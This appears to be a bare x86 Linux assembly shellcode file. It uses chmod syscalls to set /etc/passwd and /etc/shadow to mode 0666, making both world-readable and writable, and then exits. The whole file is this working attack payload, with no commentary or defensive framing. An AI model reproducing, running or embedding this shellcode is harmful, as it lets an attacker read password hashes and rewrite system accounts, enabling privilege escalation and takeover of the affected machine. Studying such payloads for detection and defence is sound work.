global _start

section .text

_start:

	xor eax,eax
	mov cx,0x1b6
	push eax
	push dword 0x64777373
	push dword 0x61702f2f
	push dword 0x6374652f
	mov ebx,esp
	mov al,0xf
	int 0x80
	xor eax,eax
	push eax
	push dword 0x776f6461
	push dword 0x68732f2f
	push dword 0x6374652f
	mov ebx,esp
	mov al,0xf
	int 0x80
	xor eax,eax
	inc eax
	int 0x80
